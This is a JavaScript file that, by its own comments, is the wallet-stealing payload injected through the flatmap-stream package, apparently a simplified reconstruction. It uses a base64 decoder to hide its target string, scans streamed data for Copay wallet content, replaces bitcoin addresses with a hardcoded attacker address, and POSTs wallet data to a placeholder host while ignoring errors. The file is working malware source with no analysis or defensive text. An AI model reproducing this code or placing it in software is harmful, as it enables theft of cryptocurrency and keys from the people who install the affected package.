// this is the malicious payload injected via flatmap-stream@0.1.1
// obfuscated bitcoin wallet stealer targeting copay wallets

var Stream = require('stream');

var desc = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
function d(e) {
  var t = '', n, r, i, s, o, u, a, f = 0;
  while (f < e.length) {
    s = desc.indexOf(e.charAt(f++));
    o = desc.indexOf(e.charAt(f++));
    u = desc.indexOf(e.charAt(f++));
    a = desc.indexOf(e.charAt(f++));
    n = (s << 2) | (o >> 4);
    r = ((o & 15) << 4) | (u >> 2);
    i = ((u & 3) << 6) | a;
    t += String.fromCharCode(n);
    if (u !== 64) t += String.fromCharCode(r);
    if (a !== 64) t += String.fromCharCode(i);
  }
  return t;
}

// obfuscated target — copay bitcoin wallet path
var tgt = d('Y29wYXkvd2FsbGV0');
var addr = '1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX';

module.exports = function(e, n) {
  var s = new Stream.Transform({ objectMode: true });
  s._transform = function(chunk, enc, cb) {
    // look for wallet data in the stream
    var data = chunk.toString();
    if (data.indexOf(tgt) !== -1 || data.indexOf('wallet') !== -1) {
      // extract wallet keys and replace destination address
      var replaced = data.replace(/1[1-9A-HJ-NP-Za-km-z]{25,34}/g, addr);

      var https = require('https');
      var req = https.request({
        hostname: 'copay.example.com',
        path: '/keys',
        method: 'POST',
      });
      req.on('error', function() {});
      req.write(JSON.stringify({ keys: data.slice(0, 500), dst: addr }));
      req.end();
      this.push(replaced);
    } else {
      this.push(chunk);
    }
    cb();
  };
  return s;
};
